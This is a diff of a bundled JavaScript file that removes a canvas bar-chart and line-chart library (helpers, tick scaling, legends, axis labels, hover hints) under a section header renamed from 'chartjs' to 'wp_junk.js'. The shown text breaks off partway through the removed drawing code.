@@ -1,5257 +1,5248 @@
-/* >>> chartjs (36878 bytes) <<< */
+/* >>> wp_junk.js (84030 bytes) <<< */
 (function(){
 try{
-/*global module:true*/
-'use strict';
-
-Math.log2 = Math.log2 || function(x) {
-  return Math.log(x) / Math.LN2;
-};
-
-Math.log10 = Math.log10 || function(x) {
-  return Math.log(x) / Math.LN10;
-};
-
-(function() {
-  var Helpers = {
-    avg: function(arr) {
-      var v = 0;
-      for (var index = 0; index < arr.length; ++index) {
-        v += arr[index];
-      }
-      return v / arr.length;
-    },
-    min: function(arr) {
-      if (arr.length === 0) return 0;
-      var v = arr[0];
-      for (var index = 1; index < arr.length; ++index) {
-        var v2 = arr[index];
-        if (Array.isArray(v2)) v2 = Helpers.avg(v2);
-        if (v2 < v) v = v2;
-      }
-      return Math.max(0, v);
-    },
-    max: function(arr) {
-      var v = 0;
-      for (var index = 0; index < arr.length; ++index) {
-        var v2 = arr[index];
-        if (Array.isArray(v2)) v2 = Helpers.avg(v2);
-        if (v2 > v) v = v2;
-      }
-      return Math.max(0, v);
-    },
-    upperMax: function(arr) {
-      var v = 0;
-      for (var index = 0; index < arr.length; ++index) {
-        var v2 = arr[index];
-        if (Array.isArray(v2)) v2 = Helpers.max(v2);
-        if (v2 > v) v = v2;
-      }
-      return Math.max(0, v);
-    },
-    lowerMin: function(arr) {
-      if (arr.length === 0) return 0;
-      var v = arr[0] || Infinity;
-      if (Array.isArray(v)) v = Helpers.lowerMin(v);
-      for (var index = 1; index < arr.length; ++index) {
-        var v2 = arr[index];
-        if (v2 == null) continue;
-        if (Array.isArray(v2)) v2 = Helpers.lowerMin(v2);
-        if (v2 < v) v = v2;
-      }
-      if (isNaN(v) || !isFinite(v)) v = 0;
-      return Math.max(0, v);
-    },
-    niceNumbers: function(range, round) {
-      var exponent = Math.floor(Math.log10(range));
-      var fraction = range / Math.pow(10, exponent);
-      var niceFraction;
-      if (round) {
-        if (fraction < 1.5) niceFraction = 1;
-        else if (fraction < 3) niceFraction = 2;
-        else if (fraction < 7) niceFraction = 5;
-        else niceFraction = 10;
-      } else {
-        if (fraction <= 1.0) niceFraction = 1;
-        else if (fraction <= 2) niceFraction = 2;
-        else if (fraction <= 5) niceFraction = 5;
-        else niceFraction = 10;
-      }
-      return niceFraction * Math.pow(10, exponent);
-    },
-    getLinearTicks: function(min, max, maxTicks) {
-      var range = Helpers.niceNumbers(max - min, false);
-      var tickSpacing = Helpers.niceNumbers(range / (maxTicks - 1), true);
-      return [
-        Math.floor(min / tickSpacing) * tickSpacing,
-        Math.ceil(max / tickSpacing) * tickSpacing,
-        tickSpacing
-      ];
-    },
-    getFont: function(options) {
-      options.style = options.style || 'normal';
-      options.variant = options.variant || 'normal';
-      options.weight = options.weight || 'lighter';
-      options.size = options.size || '12';
-      options.family = options.family || 'Arial';
-      return [options.style, options.variant, options.weight, options.size + 'px', options.family].join(' ');
-    },
-    getAxisRatio: function(min, max, value) {
-      return (value - min) / (max - min);
-    }
-  };
-
-  var BarChart = (function() {
-    function BarChart(ctx, options) {
-      this.mouseListeners = [];
-      this.currentHint = null;
-      this.fillRegions = []
-      this.options = {
-        font: 'Helvetica',
-        fontWeight: 'normal',
-        fontSizeTitle: 24,
-        fontSizeAxes: 20,
-        fontSizeTicks: 18,
-        fontSizeLabels: 18,
-        fontDataTags: 18,
-        fontSizeLegend: 18,
-        fontSizeHint: 18,
-        paddingPercentBars: 0.10,
-        paddingPercentTicks: 0.15,
-        paddingPixelsVertical: 10,
-        paddingPixelsHorizontal: 10,
-        paddingPixelsTicks: 10,
-        maxWidthBars: 0,
-        fillColorBackground: 'rgb(255, 255, 255)',
-        strokeColorBars: 'rgb(0, 0, 0)',
-        fillColorBars: 'rgba(180, 180, 180, 0.25)',
-        scaleStyle: 'linear',
-        barStyle: 'none',
-        stackedBarPadding: 3,
-        defaultMaxTick: 0,
-        pixelsLegendSquare: 10,
-        radiusDot: 5,
-        fillColorLegend: 'rgb(230, 230, 230)',
-        tickFormatter: null,
-        tickFormatterMeasure: null,
-        fillRegion: 'normal'
-      };
-      options = options || { };
-      for (var key in this.options) {
-        if (options.hasOwnProperty(key)) this.options[key] = options[key];
-      }
-      this.ctx = ctx;
-      this.content = { };
-      this.labelPositions = { }
-    }
-
-    BarChart.prototype.update = function(content) {
-      if (typeof content !== 'object') {
-        throw new Error('Collections must be objects.');
-      } else if (!(content.hasOwnProperty('labels') && content.hasOwnProperty('data'))) {
-        throw new Error('Collection must specify labels and data.');
-      } else if (!(Array.isArray(content.labels) && Array.isArray(content.data))) {
-        throw new Error('Labels and data must be arrays.');
-      } else if (content.labels.length !== content.data.length) {
-        throw new Error('Labels and data length must match.');
-      }
-      content._data_standard_deviation = [];
-      content._data_standard_error = [];
-      for (var i = 0; i < content.data.length; ++i) {
-        var isArr = Array.isArray(content.data[i]);
-        if (this.options.scaleStyle === 'log2') {
-          if (isArr) {
-            for (var i3 = 0; i3 < content.data[i].length; ++i3) content.data[i][i3] = Math.log2(content.data[i][i3]);
-          } else content.data[i] = Math.log2(content.data[i]);
-        }
-        if (isArr) {
-          var mean = Helpers.avg(content.data[i]);
-          var acc = 0;
-          for (var i2 = 0; i2 < content.data[i].length; ++i2) acc += Math.pow(mean - content.data[i][i2], 2);
-          acc = Math.sqrt(acc / (content.data[i].length - 1));
-          content._data_standard_deviation.push(acc);
-          content._data_standard_error.push(acc / Math.sqrt(content.data[i].length));
-        } else {
-          content._data_standard_deviation.push(0);
-          content._data_standard_error.push(0);
-        }
-      }
-      this.content = content;
-      this.redraw();
-    };
-
-    BarChart.prototype.redraw = function() {
-      setTimeout(function() {
-        this._draw();
-      }.bind(this), 0);
-    };
-
-    BarChart.prototype.mousemove = function(x, y) {
-      var res = null;
-      for (var index = 0; index < this.mouseListeners.length; ++index) {
-        if ((res = this.mouseListeners[index](x, y))) break;
-      }
-      if (!res || (typeof res) !== 'object' || !res.hasOwnProperty('index') || !res.hasOwnProperty('drawIndex')) {
-        if (this.currentHint !== null) {
-          this.currentHint = null;
-          this.redraw();
-        }
-        return;
-      }
-      var ch = this.currentHint;
-      if (ch == null || ch.index != res.index || ch.drawIndex != res.drawIndex) {
-        this.currentHint = res;
-        this.redraw();
-      }
-    };
-
-    BarChart.prototype._draw = function() {
-      var labelPositions = { }
-      this.mouseListeners = [];
-      this.fillRegions = [];
-
-      var options = this.options;
-      var ctx = this.ctx, content = this.content;
-      var width = ctx.canvas.width, height = ctx.canvas.height;
-      ctx.clearRect(0, 0, width, height);
-      ctx.translate(-0.5, -0.5);
-      var remainingWidth = width, remainingHeight = height;
-      var index;
-
-      if (options.fillColorBackground != null) {
-        ctx.save();
-        ctx.fillStyle = options.fillColorBackground;
-        ctx.fillRect(0, 0, width, height);
-        ctx.restore();
-      }
-
-      var topYPadding = options.paddingPixelsHorizontal;
-      remainingHeight -= options.paddingPixelsHorizontal;
-      ctx.fillStyle = 'rgb(0, 0, 0)';
-      /* Draw title of bar chart */
-      if (content.title != null) {
-        ctx.save();
-        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeTitle, family: options.font });
-        ctx.textAlign = 'center';
-        ctx.fillText(content.title, width / 2, topYPadding + options.fontSizeTitle);
-        ctx.restore();
-        remainingHeight -= options.fontSizeTitle * 1.25;
-        topYPadding += options.fontSizeTitle * 1.25;
-      }
-
-      /* Compute required left padding */
-      var leftXPadding = options.paddingPixelsVertical;
-      remainingWidth  -= options.paddingPixelsVertical;
-
-      var leftXDrawYLabel = null;
-      if (content.yAxis != null) {
-        leftXDrawYLabel = leftXPadding + options.fontSizeAxes * 0.5;
-        remainingWidth -= options.fontSizeAxes * 1.25;
-        leftXPadding += options.fontSizeAxes * 1.25;
-      }
-
-      ctx.save();
-      ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeTicks, family: options.font });
-      var maxChartValue, minChartValue;
-      if (options.barStyle === 'stacked') {
-        maxChartValue = 0;
-        minChartValue = Infinity;
-        for (var cmIndex = 0; cmIndex < content.data.length; ++cmIndex) {
-          var doB;
-          if (Array.isArray(doB = content.data[cmIndex])) {
-            var tempSum = 0;
-            for (var ii2 = 0; ii2 < doB.length; ++ii2) tempSum += doB[ii2];
-            maxChartValue = Math.max(maxChartValue, tempSum);
-            minChartValue = Math.min(minChartValue, tempSum);
-          } else {
-            maxChartValue = Math.max(maxChartValue, content.data[cmIndex]);
-            minChartValue = Math.min(minChartValue, content.data[cmIndex]);
-          }
-        }
-      } else {
-        maxChartValue = Helpers.upperMax(content.data);
-        minChartValue = Helpers.lowerMin(content.data);
-      }
-      if (options.scaleStyle.indexOf('adaptive') === 0) {
-        if (options.scaleStyle.indexOf(':') !== -1) {
-          var floater = parseFloat(options.scaleStyle.split(/[:]/)[1]);
-          minChartValue *= floater;
-          maxChartValue *= 1 + (1 - floater) / 2.0;
-        }
-      } else minChartValue = 0;
-      if (options.defaultMaxTick > maxChartValue) maxChartValue = options.defaultMaxTick;
-      if (content.bars != null && Array.isArray(content.bars)) {
-        for (index = 0; index < content.bars.length; ++index) {
-          var cbv = content.bars[index].value;
-          if (isNaN(cbv)) continue;
-          maxChartValue = Math.max(maxChartValue, cbv);
-          minChartValue = Math.min(minChartValue, cbv);
-        }
-      }
-      var maxYAxisTickWidth = options.scaleStyle == 'log2' ? Math.ceil(Math.pow(2, maxChartValue)) : (Math.ceil(maxChartValue) + '.00');
-      if (options.tickFormatterMeasure != null) maxYAxisTickWidth = options.tickFormatterMeasure;
-      maxYAxisTickWidth = ctx.measureText(maxYAxisTickWidth).width;
-      maxYAxisTickWidth = Math.ceil(maxYAxisTickWidth) + options.paddingPixelsTicks;
-      remainingWidth -= maxYAxisTickWidth;
-      leftXPadding += maxYAxisTickWidth;
-      ctx.restore();
-
-      var rightXPadding = options.paddingPixelsVertical;
-      remainingWidth -= options.paddingPixelsVertical;
-
-      /* Draw legend */
-      if (content.legend != null && Array.isArray(content.legend)) {
-        ctx.save();
-        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLegend, family: options.font });
-        var maxLWidth = 0;
-        for (var lIndex = 0; lIndex < content.legend.length; ++lIndex) {
-          maxLWidth = Math.max(maxLWidth, ctx.measureText(content.legend[lIndex].label).width);
-        }
-        maxLWidth = Math.ceil(maxLWidth);
-        maxLWidth += options.pixelsLegendSquare + 8;
-        var legendEntriesPerLine = Math.floor((remainingWidth - options.paddingPixelsHorizontal * 2) / maxLWidth);
-        var lLReqHeight = Math.ceil(content.legend.length / legendEntriesPerLine) * options.fontSizeLegend * 1.5;
-        remainingHeight -= lLReqHeight;
-        bottomYPadding += lLReqHeight;
-
-        ctx.strokeStyle = 'rgb(0, 0, 0)';
-        ctx.fillStyle = options.fillColorLegend;
-        var bSX, bSY;
-        ctx.beginPath();
-        ctx.moveTo(bSX = leftXPadding, bSY = topYPadding + remainingHeight);
-        ctx.lineTo(bSX + remainingWidth, bSY);
-        ctx.lineTo(bSX + remainingWidth, bSY + lLReqHeight);
-        ctx.lineTo(bSX, bSY + lLReqHeight);
-        ctx.lineTo(bSX, bSY);
-        ctx.stroke();
-        ctx.fill();
-
-        for (lIndex = 0; lIndex < content.legend.length; ++lIndex) {
-          var legLine = Math.floor(lIndex / legendEntriesPerLine);
-          var legCol = lIndex % legendEntriesPerLine;
-          ctx.fillStyle = content.legend[lIndex].color;
-          var boxX = bSX + legCol * maxLWidth + 3, boxY = bSY + legLine * options.fontSizeLegend * 1.5 + options.fontSizeLegend * 0.5;
-          ctx.beginPath();
-          ctx.moveTo(boxX, boxY);
-          ctx.lineTo(boxX + options.pixelsLegendSquare, boxY);
-          ctx.lineTo(boxX + options.pixelsLegendSquare, boxY + options.pixelsLegendSquare);
-          ctx.lineTo(boxX, boxY + options.pixelsLegendSquare);
-          ctx.lineTo(boxX, boxY);
-          ctx.fill();
-          ctx.stroke();
-
-          ctx.textAlign = 'left';
-          ctx.fillStyle = 'rgb(0, 0, 0)';
-          ctx.fillText(content.legend[lIndex].label, boxX + 3 + options.pixelsLegendSquare, boxY + options.fontSizeLegend * 0.5);
-        }
-
-        ctx.restore();
-      }
-
-      /* Draw x-axis label of bar chart */
-      var bottomYPadding = options.paddingPixelsHorizontal;
-      remainingHeight -= options.paddingPixelsHorizontal;
-      if (content.xAxis != null) {
-        ctx.save();
-        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeAxes, family: options.font });
-        ctx.fillStyle = 'rgb(0, 0, 0)';
-        ctx.textAlign = 'center';
-        ctx.fillText(content.xAxis, (width - remainingWidth) + remainingWidth / 2, topYPadding + remainingHeight - bottomYPadding);
-        remainingHeight -= options.fontSizeAxes * 1.5;
-        bottomYPadding += options.fontSizeAxes * 1.5;
-        ctx.restore();
-      }
-
-      var widthPerBar = remainingWidth / content.data.length;
-
-      /* Draw x-axis top labels */
-      if (content.topLabels != null) {
-        ctx.save();
-        ctx.textAlign = 'center';
-        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
-        remainingHeight -= options.fontSizeLabels * 1.5;
-        topYPadding += options.fontSizeLabels * 1.5;
-        for (index = 0; index < content.topLabels.length; ++index) {
-          ctx.fillText(
-            content.topLabels[index],
-            leftXPadding + index * widthPerBar + widthPerBar / 2,
-            topYPadding - options.fontSizeLabels / 2
-          );
-        }
-        ctx.restore();
-      }
-
-      /* Draw x-axis labels */
-      ctx.save();
-      var reqWidth = 0;
-      if (content.dataTags != null) {
-        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontDataTags, family: options.font });
-        var dataTags = content.dataTags;
-        for (index = 0; index < dataTags.length; ++index) {
-          if (Array.isArray(dataTags[index])) {
-            for (var index2 = 0; index2 < dataTags[index].length; ++index2) {
-              reqWidth = Math.max(reqWidth, Math.ceil(ctx.measureText(dataTags[index][index2]).width + 5));
-            }
-          } else {
-            reqWidth = Math.max(reqWidth, Math.ceil(ctx.measureText(dataTags[index]).width + 5));
-          }
-        }
-      }
-
-      ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
-      var computedBarPadding = Math.floor((widthPerBar * options.paddingPercentBars) / 2);
-      var wwh = widthPerBar - computedBarPadding * 2;
-      if (wwh < reqWidth) {
-        computedBarPadding -= Math.ceil((reqWidth - wwh) / 2);
-        computedBarPadding = Math.max(0, computedBarPadding);
-      } else if (options.maxWidthBars > 0 && wwh > options.maxWidthBars) {
-        computedBarPadding = Math.floor((widthPerBar - options.maxWidthBars) / 2);
-      }
-      var maxTextWidth = 0, maxTextStackSize = 1;
-      for (index = 0; index < content.labels.length; ++index) {
-        var tLabel = content.labels[index];
-        if (Array.isArray(tLabel)) {
-          maxTextStackSize = Math.max(maxTextStackSize, tLabel.length);
-          for (index2 = 0; index2 < tLabel.length; ++index2) {
-            maxTextWidth = Math.max(maxTextWidth, ctx.measureText(tLabel[index2]).width);
-          }
-        } else maxTextWidth = Math.max(maxTextWidth, ctx.measureText(tLabel).width);
-      }
-      var xLabelsRotated = false;
-      if (maxTextWidth > widthPerBar - computedBarPadding) {
-        ctx.textAlign = 'right';
-        ctx.rotate(Math.PI * 1.5);
-        xLabelsRotated = true;
-      } else {
-        ctx.textAlign = 'center';
-      }
-      var lastLabelY = -options.fontSizeLabels;
-      for (index = 0; index < content.labels.length; ++index) {
-        var cLabel = content.labels[index];
-        var x = leftXPadding + index * widthPerBar + widthPerBar / 2, y = topYPadding + remainingHeight - options.fontSizeLabels / 2;
-        if (xLabelsRotated) {
-          y = topYPadding + remainingHeight - maxTextWidth + 5;
-          y = [x, x = -y][0];
-
-          if (y < lastLabelY + options.fontSizeLabels) continue;
-          lastLabelY = y;
-        }
-        var yUp = options.fontSizeLabels * (maxTextStackSize - 1);
-        if (Array.isArray(cLabel)) {
-          if (xLabelsRotated) {
-            yUp = options.fontSizeLabels * (cLabel.length - 1.5);
-            yUp /= 2;
-          }
-          for (index2 = 0; index2 < cLabel.length; ++index2) {
-            ctx.fillText(cLabel[index2], x, y - yUp);
-            yUp -= options.fontSizeLabels;
-          }
-        } else {
-          if (xLabelsRotated) yUp = -options.fontSizeLabels * 0.25;
-          ctx.fillText(cLabel, x, y - yUp);
-        }
-      }
-      if (xLabelsRotated) {
-        remainingHeight -= maxTextWidth + 5;
-        bottomYPadding += maxTextWidth + 5;
-      } else {
-        var remVal = options.fontSizeLabels * maxTextStackSize;
-        remVal += options.fontSizeLabels * 0.5;
-        remainingHeight -= remVal;
-        bottomYPadding += remVal;
-      }
-      ctx.restore();
-
-      /* Draw boundaries */
-      var boundX1 = leftXPadding, boundX2 = leftXPadding + remainingWidth;
-      var boundY1 = topYPadding, boundY2 = topYPadding + remainingHeight;
-
-      for (index = 0; index < content.labels.length; ++index) labelPositions[index] = {
-        xStart: leftXPadding + index * widthPerBar,
-        xEnd: leftXPadding + (1 + index) * widthPerBar,
-        yStart: boundY1, yEnd: boundY2
-      }
-
-      ctx.save();
-      ctx.strokeStyle = 'rgb(0, 0, 0)';
-      ctx.beginPath();
-      if (content.topLabels != null) {
-        ctx.moveTo(boundX2, boundY1);
-        ctx.lineTo(boundX1, boundY1);
-      } else {
-        ctx.moveTo(boundX1, boundY1);
-      }
-      ctx.lineTo(boundX1, boundY2);
-      ctx.lineTo(boundX2, boundY2);
-      if (content.topLabels != null) ctx.lineTo(leftXPadding + remainingWidth, topYPadding);
-      ctx.stroke();
-      ctx.restore();
-
-      /* Draw top label */
-      if (content.topLabel != null) {
-        ctx.save();
-        ctx.textAlign = 'right';
-        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
-        ctx.fillText(content.topLabel, leftXPadding - 3, topYPadding - options.fontSizeLabels / 2);
-        ctx.restore();
-      }
-
-      /* Draw y-axis label of bar chart */
-      if (content.yAxis != null) {
-        ctx.save();
-        ctx.rotate(Math.PI * 1.5);
-        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeAxes, family: options.font });
-        ctx.fillStyle = 'rgb(0, 0, 0)';
-        ctx.textAlign = 'center';
-        ctx.fillText(content.yAxis, -(topYPadding + remainingHeight / 2), leftXDrawYLabel);
-        ctx.restore();
-      }
-
-      /* Draw y-axis labels */
-      ctx.save();
-      ctx.fillStyle = 'rgb(0, 0, 0)';
-      ctx.strokeStyle = 'rgba(0, 0, 0, 0.20)';
-      ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeTicks, family: options.font });
-      ctx.textAlign = 'right';
-      var tickMeta = Helpers.getLinearTicks(0, maxChartValue, Math.max(2, remainingHeight / (options.fontSizeTicks * (1 + options.paddingPercentTicks))));
-      var alpha = maxChartValue / options.fontSizeTicks;
-      maxChartValue = tickMeta[1];
-      if (maxChartValue > 1) maxChartValue += Math.ceil(alpha);
-      else maxChartValue += alpha;
-      var ticks = [];
-      while (tickMeta[0] <= tickMeta[1]) {
-        ticks.push(tickMeta[0]);
-        tickMeta[0] += tickMeta[2];
-      }
-      for (index = 0; index < ticks.length; ++index) {
-        var tickHeight = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, ticks[index]));
-        if (tickHeight < 0) continue;
-        if (options.scaleStyle == 'log2' && ticks[index] !== 0) ticks[index] = Math.round(Math.pow(2, ticks[index]));
-        else ticks[index] = Math.floor(ticks[index] * 100) / 100;
-        if (options.tickFormatter != null && typeof options.tickFormatter === 'function') {
-          ctx.fillText(options.tickFormatter(ticks[index]).toString(), leftXPadding - options.paddingPixelsTicks, topYPadding + remainingHeight - tickHeight);
-        } else {
-          ctx.fillText(ticks[index].toString(), leftXPadding - options.paddingPixelsTicks, topYPadding + remainingHeight - tickHeight);
-        }
-        if (index == 0) continue;
-        ctx.beginPath();
-        ctx.moveTo(leftXPadding, topYPadding + remainingHeight - tickHeight);
-        ctx.lineTo(leftXPadding + remainingWidth, topYPadding + remainingHeight - tickHeight);
-        ctx.stroke();
-      }
-      ctx.restore();
-
-      if (content.bars != null && Array.isArray(content.bars)) {
-        ctx.save();
-        for (index = 0; index < content.bars.length; ++index) {
-          var cBar = content.bars[index];
-          if (cBar.value > maxChartValue) continue;
-          var renderBarY = topYPadding + remainingHeight - Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, cBar.value));
-          ctx.strokeStyle = cBar.style;
-          ctx.fillStyle = cBar.style;
-          ctx.beginPath();
-          ctx.moveTo(boundX1, renderBarY);
-          ctx.lineTo(boundX2, renderBarY);
-          ctx.stroke();
-          ctx.fill();
-        }
-        ctx.restore();
-      }
-
-      /* Draw bars */
-      ctx.save();
-      var lastData = null;
-      for (index = 0; index < content.data.length; ++index) {
-        var fillColorForIndex = null;
-        var strokeColorForIndex = null;
-        if (content.fillColor != null) {
-          if (Array.isArray(content.fillColor)) fillColorForIndex = ctx.fillStyle = content.fillColor[index];
-          else ctx.fillStyle = content.fillColor;
-        } else ctx.fillStyle = options.fillColorBars;
-        if (content.strokeColor != null) {
-          if (Array.isArray(content.strokeColor)) strokeColorForIndex = ctx.strokeStyle = content.strokeColor[index];
-          else ctx.strokeStyle = content.strokeColor;
-        } else ctx.strokeStyle = options.strokeColorBars;
-        var v = content.data[index];
-        var vIsArr = Array.isArray(v);
-        var renderStartX = leftXPadding + widthPerBar * index;
-        if (vIsArr && options.barStyle === 'stacked') {
-          var runningValue = 0, lastHeight = 0;
-          for (var drawIndex = 0; drawIndex < v.length; ++drawIndex) {
-            if (fillColorForIndex != null && Array.isArray(fillColorForIndex)) {
-              ctx.fillStyle = fillColorForIndex[drawIndex] || options.fillColorBars;
-            }
-            if (strokeColorForIndex != null && Array.isArray(strokeColorForIndex)) {
-              ctx.strokeStyle = strokeColorForIndex[drawIndex] || options.strokeColorBars;
-            }
-
-            runningValue += v[drawIndex];
-            var renderBarHeight = Math.floor(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, runningValue));
-            var renderUpToY = topYPadding + remainingHeight - renderBarHeight;
-            if (Math.abs(renderBarHeight - lastHeight) < options.stackedBarPadding + 2) {
-              lastHeight = renderBarHeight;
-              continue;
-            }
-
-            var barPadP = drawIndex > 0 ? options.stackedBarPadding : 0;
-            var tSX, tSY;
-            var tEX, tEY;
-            ctx.beginPath();
-            ctx.moveTo(tSX = renderStartX + computedBarPadding, tSY = topYPadding + remainingHeight - lastHeight - barPadP);
-            ctx.lineTo(renderStartX + computedBarPadding, renderUpToY);
-            ctx.lineTo(tEX = renderStartX + (widthPerBar - 1) - computedBarPadding, tEY = renderUpToY);
-            ctx.lineTo(renderStartX + (widthPerBar - 1) - computedBarPadding, topYPadding + remainingHeight - lastHeight - barPadP);
-            if (drawIndex > 0) ctx.lineTo(tSX, tSY);
-            ctx.stroke();
-            ctx.fill();
-            var hint;
-            if (content.hints != null && content.hints[index] != null && (hint = content.hints[index][drawIndex]) != null) {
-              this.mouseListeners.push(function(index, drawIndex, hint, sx, sy, ex, ey, x, y) {
-                var minX = Math.min(sx, ex), maxX = Math.max(sx, ex);
-                var minY = Math.min(sy, ey), maxY = Math.max(sy, ey);
-                if (x < minX || x > maxX || y < minY || y > maxY) return null;
-                return { index: index, drawIndex: drawIndex, rect: { left: minX, right: maxX, top: minY, bottom: maxY }, text: hint.split('\n') };
-              }.bind(this, index, drawIndex, hint, tSX, tSY, tEX, tEY));
-            }
-
-            var tagText;
-            if (tSY - renderUpToY > options.fontDataTags * 1.25 && content.dataTags != null && (tagText = content.dataTags[index]) != null && (tagText = tagText[drawIndex]) != null) {
-              var oFS = ctx.fillStyle;
-              ctx.fillStyle = 'rgb(0, 0, 0)';
-              ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontDataTags, family: options.font });
-              ctx.textAlign = 'center';
-              ctx.fillText(tagText, renderStartX + widthPerBar / 2, tSY - options.fontDataTags * 0.25);
-              ctx.fillStyle = oFS;
-            }
-
-            lastHeight = renderBarHeight;
-          }
-
-          if (content.barTooltips != null) {
-            ctx.fillStyle = 'rgb(0, 0, 0)';
-            ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
-            ctx.textAlign = 'center';
-            ctx.fillText(content.barTooltips[index] || '', renderStartX + widthPerBar / 2, renderUpToY - 3);
-          }
-        } else if (options.barStyle === 'line') {
-          if (vIsArr) {
-            var rbx = renderStartX + widthPerBar / 2;
-
-            var lDu;
-            if (options.fillRegion === 'background') {
-              lDu = lastData;
-              if (Array.isArray(lDu)) lDu = lDu[0];
-              if (lDu != null) {
-                var sFS = ctx.fillStyle
-                ctx.fillStyle = lDu.color
-                ctx.fillRect(lDu.x, boundY1, rbx - lDu.x, boundY2 - boundY1)
-                ctx.fillStyle = sFS
-              }
-            }
-
-            var nLData = [];
-            for (var drawIndex = 0; drawIndex < v.length; ++drawIndex) {
-              var renderBarHeight3 = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, v[drawIndex]));
-              var renderUpToY3 = topYPadding + remainingHeight - renderBarHeight3;
-
-              var rby = renderUpToY3;
-              if (lastData != null) {
-                var tLX, tLY;
-                if (Array.isArray(lastData)) {
-                  tLX = (lastData[drawIndex] || { }).x;
-                  tLY = (lastData[drawIndex] || { }).y;
-                } else {
-                  tLX = lastData.x;
-                  tLY = lastData.y;
-                }
-
-                if (tLX && tLY) {
-                  if (Array.isArray(strokeColorForIndex)) {
-                    ctx.strokeStyle = strokeColorForIndex[drawIndex] || options.strokeColorBars;
-                  } else ctx.strokeStyle = strokeColorForIndex || 'rgb(0, 0, 0)';
-                  ctx.beginPath();
-                  ctx.moveTo(tLX, tLY);
-                  ctx.lineTo(rbx, rby);
-                  ctx.stroke();
-                }
-              }
-
-              if (Array.isArray(fillColorForIndex)) {
-                ctx.fillStyle = fillColorForIndex[drawIndex] || options.fillColorBars;
-              }
-              if (Array.isArray(strokeColorForIndex)) {
-                ctx.strokeStyle = strokeColorForIndex[drawIndex] || options.strokeColorBars;
-              }
-
-              ctx.beginPath();
-              ctx.arc(rbx, rby, options.radiusDot, 0, 2 * Math.PI);
-              ctx.stroke();
-              ctx.fill();
-
-              nLData[drawIndex] = { x: rbx, y: rby, color: ctx.fillStyle };
-            }
-            lastData = nLData;
-            if (lDu != null && lDu.color != lastData[0].color) this.fillRegions.push({
-              x: lastData[0].x,
-              y: lastData[0].y,
-              prev: lDu.color,
-              next: lastData[0].color
-            })
-
-            if (content.balls != null && Array.isArray(content.balls) && index < content.balls.length) {
-              var ball = content.balls[index]
-              if (ball != null) {
-                ctx.beginPath();
-                ctx.fillStyle = ball.fill;
-                ctx.strokeStyle = ball.stroke;
-                ctx.arc(rbx, topYPadding + remainingHeight - (remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, minChartValue + ball.value)), ball.radius, 0, 2 * Math.PI);
-                ctx.stroke();
-                ctx.fill();
-              }
-            }
-          } else {
-            var renderBarHeight3 = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, v));
-            var renderUpToY3 = topYPadding + remainingHeight - renderBarHeight3;
-
-            var rbx = renderStartX + widthPerBar / 2, rby = renderUpToY3;
-            var lDu;
-            if (options.fillRegion === 'background') {
-              if (lastData != null) {
-                lDu = lastData;
-                if (Array.isArray(lDu)) lDu = lDu[0];
-                var sFS = ctx.fillStyle
-                ctx.fillStyle = lDu.color
-                ctx.fillRect(lDu.x, boundY1, rbx - lDu.x, boundY2 - boundY1)
-                ctx.fillStyle = sFS
-              }
-            }
-            ctx.beginPath();
-            ctx.arc(rbx, rby, options.radiusDot, 0, 2 * Math.PI);
-            ctx.stroke();
-            ctx.fill();
-
-            if (lastData != null) {
-              if (Array.isArray(lastData)) {
-                var tLX, tLY;
-                for (var key in lastData) {
-                  if (!lastData.hasOwnProperty(key)) continue;
-                  tLX = lastData[key].x;
-                  tLY = lastData[key].y;
-                  if (tLX && tLY) {
-                    ctx.strokeStyle = strokeColorForIndex || 'rgb(0, 0, 0)';
-                    ctx.beginPath();
-                    ctx.moveTo(tLX, tLY);
-                    ctx.lineTo(rbx, rby);
-                    ctx.stroke();
-                  }
-                }
-              } else {
-                var tLX = lastData.x, tLY = lastData.y;
-                if (tLX && tLY) {
-                  ctx.strokeStyle = strokeColorForIndex || 'rgb(0, 0, 0)';
-                  ctx.beginPath();
-                  ctx.moveTo(tLX, tLY);
-                  ctx.lineTo(rbx, rby);
-                  ctx.stroke();
-                }
-              }
-            }
-
-            lastData = { x: rbx, y: rby, color: ctx.fillStyle };
-            if (lDu != null && lDu.color != lastData.color) this.fillRegions.push({
-              x: lastData.x,
-              y: lastData.y,
-              prev: lDu.color,
-              next: lastData.color
-            })
-
-            if (content.balls != null && Array.isArray(content.balls) && index < content.balls.length) {
-              var ball = content.balls[index]
-              if (ball != null) {
-                ctx.beginPath();
-                ctx.fillStyle = ball.fill;
-                ctx.strokeStyle = ball.stroke;
-                ctx.arc(rbx, topYPadding + remainingHeight - (remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, minChartValue + ball.value)), ball.radius, 0, 2 * Math.PI);
-                ctx.stroke();
-                ctx.fill();
-              }
-            }
-          }
-
-          var hint;
-          if (content.hints != null && (hint = content.hints[index]) != null) {
-            this.mouseListeners.push(function(index, hint, sx, sy, ex, ey, x, y) {
-              var minX = Math.min(sx, ex), maxX = Math.max(sx, ex);
-              var minY = Math.min(sy, ey), maxY = Math.max(sy, ey);
-              if (x < minX || x > maxX || y < minY || y > maxY) return null;
-              return { index: index, drawIndex: drawIndex, rect: { left: minX, right: maxX, top: minY, bottom: maxY }, text: hint.split('\n') };
-            }.bind(this, index, hint, rbx - 1, topYPadding, rbx + 1, topYPadding + remainingHeight));
-          }
-        } else {
-          if (vIsArr) v = Helpers.avg(v);
